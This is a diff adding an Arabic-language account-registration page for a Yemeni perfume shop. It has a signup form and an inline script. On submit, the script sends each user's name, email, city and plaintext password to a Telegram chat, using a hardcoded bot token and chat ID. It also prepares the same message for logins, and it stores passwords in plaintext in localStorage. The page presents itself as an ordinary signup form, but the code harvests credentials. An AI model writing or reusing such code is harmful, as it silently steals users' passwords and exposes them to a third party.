@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>إنشاء حساب – المسعودي للعطور</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="auth-page">
+
+<div style="position:fixed;top:0;left:0;right:0;z-index:100;">
+  <div class="announcement-bar">
+    <span class="icon-blink">🎉</span> سجّل الآن واستمتع بالعروض الحصرية <span class="icon-blink">🎁</span>
+  </div>
+</div>
+
+<div class="auth-card" style="margin-top:50px; max-width:540px;">
+  <div class="auth-logo">
+    <a href="index.html" style="display:block;margin-bottom:8px;">
+      <div style="font-size:1.8rem;font-weight:900;background:linear-gradient(90deg,#8B4513,#D4AF37);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">المسعودي للعطور</div>
+    </a>
+    <h2>إنشاء حساب جديد</h2>
+    <p>انضم إلينا واستمتع بالعروض الحصرية</p>
+  </div>
+
+  <div class="alert-msg" id="alertMsg"></div>
+
+  <form id="registerForm">
+    <div class="form-row">
+      <div class="form-group">
+        <label>👤 الاسم الأول</label>
+        <input type="text" id="firstName" placeholder="محمد" required>
+      </div>
+      <div class="form-group">
+        <label>👤 الاسم الأخير</label>
+        <input type="text" id="lastName" placeholder="المسعودي" required>
+      </div>
+    </div>
+    <div class="form-group">
+      <label>📧 البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="example@email.com" required>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>🏙️ المدينة</label>
+        <select id="city" required>
+          <option value="">اختر مدينتك</option>
+          <option value="صنعاء">صنعاء</option>
+          <option value="عدن">عدن</option>
+          <option value="تعز">تعز</option>
+          <option value="الحديدة">الحديدة</option>
+          <option value="إب">إب</option>
+          <option value="المكلا">المكلا</option>
+          <option value="سيئون">سيئون</option>
+          <option value="ذمار">ذمار</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>🌍 الدولة</label>
+        <input type="text" value="اليمن" readonly style="background:#f0f0f0;cursor:not-allowed;">
+      </div>
+    </div>
+    <div class="form-group">
+      <label>🔑 كلمة المرور</label>
+      <input type="password" id="password" placeholder="8 أحرف على الأقل" required minlength="6">
+    </div>
+    <div class="form-group">
+      <label>🔑 تأكيد كلمة المرور</label>
+      <input type="password" id="confirmPassword" placeholder="أعد إدخال كلمة المرور" required>
+    </div>
+    <div class="form-check" style="margin-bottom:18px;">
+      <input type="checkbox" id="terms" required>
+      <label for="terms">أوافق على <a href="#" style="color:var(--brown);">الشروط والأحكام</a> وسياسة الخصوصية</label>
+    </div>
+    <button type="submit" class="btn-auth" id="submitBtn">🆕 إنشاء الحساب</button>
+  </form>
+
+  <div class="auth-links">
+    <p>لديك حساب بالفعل؟ <a href="signin.html">تسجيل الدخول</a></p>
+    <p style="margin-top:8px;"><a href="index.html" style="color:#888;">← العودة للرئيسية</a></p>
+  </div>
+</div>
+
+<script src="js/products.js"></script>
+<script src="js/main.js"></script>
+<script>
+  // ===== دالة إرسال إشعارات تليجرام (مباشرة) =====
+  function sendTelegramNotification(data) {
+    const BOT_TOKEN = '8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
+    const CHAT_ID = '7770087246';
+
+    let message = '';
+    if (data.type === 'register') {
+      message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    } else if (data.type === 'login') {
+      message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    }
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    }).catch(error => console.error('فشل إرسال الإشعار:', error));
+  }
+
+  if (isLoggedIn()) window.location.href = 'index.html';
+
+  document.getElementById('registerForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const city = document.getElementById('city').value;
+    const password = document.getElementById('password').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+    const terms = document.getElementById('terms').checked;
+    const alertMsg = document.getElementById('alertMsg');
+    const btn = document.getElementById('submitBtn');
+
+    if (!firstName || !lastName || !email || !city || !password) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ يرجى ملء جميع الحقول المطلوبة';
+      return;
+    }
+    if (password !== confirmPassword) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ كلمة المرور وتأكيدها غير متطابقتين';
+      return;
+    }
+    if (!terms) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ يجب الموافقة على الشروط والأحكام';
+      return;
+    }
+
+    btn.textContent = '...جاري إنشاء الحساب';
+    btn.disabled = true;
+
+    let users = [];
+    try { users = JSON.parse(localStorage.getItem('massoudi_users')) || []; } catch(e) {}
+    if (users.find(u => u.email === email)) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ هذا البريد الإلكتروني مسجل مسبقاً';
+      btn.disabled = false;
+      btn.textContent = '🆕 إنشاء الحساب';
+      return;
+    }
+
+    const newUser = {
+      firstName, lastName, email, password,
+      city, country: 'اليمن',
+      name: firstName + ' ' + lastName,
+      createdAt: new Date().toISOString()
+    };
+    users.push(newUser);
+    localStorage.setItem('massoudi_users', JSON.stringify(users));
+    saveUser(newUser);
+
+    sendTelegramNotification({
+      type: 'register',
+      firstName, lastName, email, city,
+      country: 'اليمن',
+      password: password,
+      time: new Date().toLocaleString('ar-YE', { timeZone: 'Asia/Aden' })
+    });
+
+    alertMsg.className = 'alert-msg alert-success';
+    alertMsg.textContent = '✅ تم إنشاء حسابك بنجاح! جاري التحويل...';
+    setTimeout(() => window.location.href = 'index.html', 1500);
+  });
+</script>
+</body>
+</html>
